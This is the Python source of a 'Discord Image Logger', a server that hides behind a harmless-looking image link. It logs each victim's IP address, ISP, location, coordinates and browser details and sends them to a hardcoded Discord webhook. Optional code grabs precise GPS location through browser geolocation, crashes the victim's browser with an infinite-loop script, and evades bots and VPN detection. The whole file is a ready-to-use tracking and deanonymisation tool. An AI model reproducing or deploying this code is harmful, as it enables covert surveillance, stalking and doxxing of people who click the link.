# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "SPA"
__description__ = "Secret Protocol Agency"
__version__ = "v2.0"
__author__ = "SPA"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1479356780625793066/7rXrol068H49QgoP7LPjUIDM_279_7W3Mn6I4LuSA9499EM-mLaF9y4dQj0xPyysgezs",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvQOFKSN6zdZCZeCgqHOQsC7fL4twBdx4PoA&s", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Stealer", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "haha you think you can steal my gif? ya allah's", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RR9200961|JwkB00{;M6A};-5D*d&6%Z8=5D*m)6%Y>+77!2@78Vv26%`d29Vj3e8YLSQ6(KPpB`GT|E-n`zGdMFWHz+MGD**}$3Jwhp4-XFyD;X6TH!C+SH!CYQH!UkGH#aRSD=RB2EjKMIH!CYEEh{T4D=RH4D=RB4D=RB2D=RB2D=YuN01*fP-~izR0U`hb5di}c0sq7R8~_0T0s{d70RR9100000000010tE&K1Oo{F!~i)E00II50R{sH1OWjF0RR91009C65d;MW5+N~B6G4#_79vtqVQ~jCfuTaN6(mDbV}ila;UoXV02l!Q0RaI40000000000000000RsXA|HJ?s5di@K0RRI50RR91000000003I0s|5uF%$pV01N{G00I#M5dc2`?dO|lYoSaW=J3C^`y<k7)I-}fbCkK!OW{%Sl>3q*^ih7Xx!WgRpFa(2Dam(i&1rU3HN{31!<U~5Z`Adr=v=D#sw48p(G%du<&UB+0H=c=mOh9o(&&=@5pV@~7iH*&0_?pJU<EiA%DoWq*JbF7fGfbeFGM&OW$23lE5N%iL_9UwdLqCI@Gi^I4h7kIBESmxYqIo2cv1Od=!<|U;jfi?B78O3dLqCI_-nHCLxFZ)h_C{@3$pY_&U8Xc4l!%9Nc#XVTHW1)d~`Qeo#V-WD5lEVvyA<pRIzXP&&tGX1}|=G#eHpm#E-=Zc9H`o4t?!<&<5+ZuHdH0`KspEq2t|J6g05!B<A0C&$jU|_glO8Y_`Fkbk#rlXoKGR8vexIc;6jMap8J-xXEY9XP@+J2;_U$d(rE4RY#K6LMlIbzD%Qa-A(YXSyk4kxcE|%Y4vG&{{Tm~cJ}(!Q15Y2ha968-ZGQMd7RU0x3eVZk1uG`Mk^ol9y9)@t9dJ(Fxk2&!Mf!IDb}Rp#U`@WNIJ!L#!E4jTJD-<eX1Etjv0Ly66SK<Emu=z@r`bpUYdEU#B;>4$^DNq*pOQy8r~~CqA!h4j$b!Ij=ejh6`3@bcG3{KEoC&<bn<h0zuz_0QK^)?DCuEhj}u&SYpLPYNzwk(($hKkFsVu}iM|OxEP>S{s)Kk_j(c$-R-!V`45IPZ4>&m%)z~%Fq|jXn+O4v6Mso2b@kU)ylh^5%gJ@Q??s&6LWZY#ZB;=P+n(02(4lW)z@qD~XK85VIF<FyIcWony=(P6Vrk<tKH*XxIuXi}`wEG$8%6h$CmrJXZm43~~!lvS^o;&%0y>ABDT75M25lU%e7<{?Bbv?Q*bS#Wolz5yYE*z|^tep3Hb}f2+4z3j2Cl=!TCpRw-nmpTMWJ5__&eT&WD`jmllX7iINiJ9hx_#Q1L-)=R{K+r%G5dFGN{H7eSK=wnMf1iJ^E4f^Of@>4ONBGKP>v-hYlLfjK1YL1v}~5j(zhm>*T%ox+u>5_pD=5#%TpMv%2AIb+Hy+;)v;@dNn^fNJx*y>%7(9N>g&E!b;6q3f|E-vbv&91Y@Ul(rmo%<4O6ZhQ)@BL?Z`FNY1Berwo!kEnOCZUd@gWLw-U+B_ik0`wHy~h-94^}WhwE-#FsfE2ej&pwASkBs@I9REljRy<v%5mYqi;QWBa6+<)l;E;e{?ZVf1`Unan+#+O~#@yJa^CXrnnLCbKWO^VnMgx!trWoUC=w--jMKd_N9BuCDA!Wwnm^SSe1TGySrQ{4~x<rrHY4nWv`dSvwu`ge#1(DWv%(&sOYajjak}T&axdZPe^@%U)o0aseS<4`+{HeSjZ3>r;fH`ZU+7Fng_Qj3uU@@2X8>&B4A**bRSeX(wFPu7#OJVsQE55wI9-v%7R^ZKmsEnbj^Rzx|%gnY5vN6rlO}$IUa^6^7e;wMMFSPUz*;E-3y_rrg*x>Z2IinsIrI)5N3rW>f*M?A_C%m16j(D<b15&Q4E-`5u?M)cY^8WB&ll7{~LIE&$iIp6O}sRp*K_t#HP0d@|wfl5|_8riB(#lWO1JHuEWeCcqFzBU!uj*<Dphd^JikkNv0DQ?aU@(7sDEgj^SFGb8}jZrn{YrsSQfE?iEvHlp9)_HAv|qWHlzC`t(^&JPkxwoLK>Ynpw})54o7_}a0jIm%p3w0rgY4y&P5CYy~?grm>SJq(@+16kB=Z4<V3saYQr9C3`AQfJbg&(lVj(-kfV+OA7K=AKQ51QcVmyB4bNvr`oK?23%LVIE2DuAWe~xka^Yj>$apQu`UyNd~pE_cKpa_}j9{aJVOAoVa5Ak>^{3rQvXH*IRA)d~by}_BPf4!s$11iteuHr^j7h6mt4R`{{NiRnGe&zAL|frVN$_0=1jBBTVUqNlq#gbBj{LQh#&nv-duVZjJGFJ5t9Sq}yi0f<P6rNhaIEOD&c)&8M%HrcX<!e6x!#@{03{`+@ZLnxC8dK=}KeM`!8)*$Ke}frHu`0XaKpo2uTeuiG!mJ}}xky8atz@iG2zeNBikHU9v3r}Ve_A@2>JOLw8L0F8UzDg7>^(1pBH`dj@Ch^QD3cx?Jx{Rg}@eJ%cm!T{I3;h)mpL*6O<E#|}+8t=STeJ$jB$7j-C=xkUd4R78%K92tY=zGU+(qH`>CJ4Y9@4S|MCI0}>_ma<~zxp;T0*!OtJ3f;C0O+^8c6}w^(Xf&R0dEw%^ty%oA@3Bvmj3`mXPO{`0X^lCS$bVUUxa10cDff<tb^qGr`9jCN2J!RUdO28S@wIS@g>r`JN_6Rjb8GoT`FT$vy^d{6_w1Q-Wz4g8cTEK#mRppP}Fve@zTm;Jg+<(5(8X%Jzk@g(~VX6!WrUg?#$ND&_b9fL1B5nHv6;GNKgO-5<mh$00{&DBoG2>K>#X200{s900000001G9Ljn(uw@VvgC`oc_AA{^k5u$17x~+8;O*uk5QH=2U*8H0{vN%y<r~m)}0ufTos7e3=1&V+y3V<vMfGi4tB^D@I1&II!000000000000000002WFl0g!n08{}Wf(Rs$fB*mh0E-nxim(6$2*_rqzdOYZJ$@6OET2quNDRKKY{6wgsY*RfV_m)1DPj>xdYE0=)~5?3+ikbanM!Mp9G*Gk&#v*W9BB8eP`dE1;g$Eg?(sDpqqkhHm2JgEJ|F&-x5>szOV0*Z$y)yaDCnCTd$^j7%Ngl4)A=(K-hC`yC3I6cN3|%&EY$X#-0XbbKO>(dPP{StTTiKs;-v{E7ty2aa-Y)Or6o5^q}qN>ol!H<F0kvISO8Zb00=}fSqvor1V8`)0000000b8(SgR5N0aUid6y)9#S#13O0KXes+I7>MdBr{m{yxV|{Z-mhqeUkNjPh^na}U$)j`bFJwkF{hoW6~ct3SKCc|xy^b?1ZUxAw&9uYwVImn^R%X4*P#1(newS=4aOSbWTTk57;Brqy+Es@d5dD;`qMQwyNlGOl@2d@sn{_SWybaltmc%nf@ho-xnxagnCJx~;6`6nLJY%P-9J-Lhqa&8N{%EhO0_iEUqHZK=_0W}C{AXXvff+bdV6g{!MeiG9z^7RAQQKDp?1pV8fYo+GCX*M{@tjrn=|b`SxhAOHneB?KZ>Kmh;<0>lsrqQC$E03fka$g2`TBn4`}s5j~3r^clxpW7d~$>F|^rmLn3H7C(>XF&a5*|MIS#E)2<B1%o+^%y(8$kxMGr*recrt5C-Epd|bGaskXaME-0W+!~$rD|z&Y~!wVw>RT0EvX4smvmz#TvN(O#c81MjEd@KcxgIT*dyt(bg9Z*mqKZw$(bD;Tr);|$9-0<4a(GNbw31BhaWjUi5;tSw{{vjR3ej`{nGBrZu?PKOR2C#--z>fQb-1jzyJ_}1PGM?0Eqw)00000KqP{JWK^(NkN{VoTcwSVaGK0tBbV<N>AaneRHV~+<hi4)5YQacVQ&7Ss3^GMBj0}Ot2x+~P45SvQ4s1@nNICj4<uIYnOs&BQLt*`gBN;v71pqm(<r`4A1K%HWf@y)$u(&XCnvKZvu$xnza(a~dt#}+9wepPCI?eqDR}FHm|v^18kXZJa)0?R;$N=z?nPy(iaDOl-;5<2`L5>I4RmD%IKPFg=j=5-S^ofRh&6xqoIYSQ^=<`A6*_T106+ju00=0MKmtJofGkw93labd5Xk^R^0gmQtrZx}Rc1EYxtZ&tj}?^UEMoi<?@b4<z&_Q|MPYW-cx(O+akQ&ZljwDAw^nNPIPUOjabt;}Rj&*d*3=~VK4$y5dsmN3I@|b^ANm}>T_-6U#^hBh>b7%DCtJg36Q;ID)7l@*$T7Y+E~m%nVx@|kJd^+g00000002k;f(s(0im@O7p#hY#UO-aI(jGcyxwZ9<xvaiVq4d)2B)YJSo!XS18EWL3<YDiz*!~>9!S~Y6P-#dyWs)qBTIHT+)T7C+uZj(QnZtLkj9oSNJH5VthI5UrvEgO2a`}w<jX1c|_hWZFY4J@y70lZAp7>Kog$yjLax(flqXd)}BV5~?I(J^W<DtamrRl0*8@IbL><j9e>jV}mYV%Zp2#5d_002QC0R)mkFbe>Ru^<4iCa+f*xW&9VbTC`Nw_{S}D7TK8=abjBb|kNyB^kKz^H}a<DBO5ERku!4Yy4kKkYhG9E!WG6$ne)5oq3xo*nJjy8Hy>45{wd2UP!d%fIOOgBCT@f%3TE6_ML<-WmPDxqw93IR!L7B&knNo`7VVQmZf3-4J&ABmmIovHd~{`7P9&nTDN<SS$Sl!b>`6B#n8*>v`$Z&GMhVL#tWh|6;h+o16Yq>V9bJI>cE6ab;U*qEszrxBmyEp1=YntU<_20NCpIuG8G_z1d%2(VRgG*aXRDGG?*DF+uH}mb7za%6cTc4pWOQ^;?{GJD`n|*JeF-}E=lE|8>*F(!s+?JkkM>7Lk;s_eCX85eovX`T3IvS3RHR|Tr0~~iFuxwRF_0aU?T+JkP%Qw1OM3')  
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
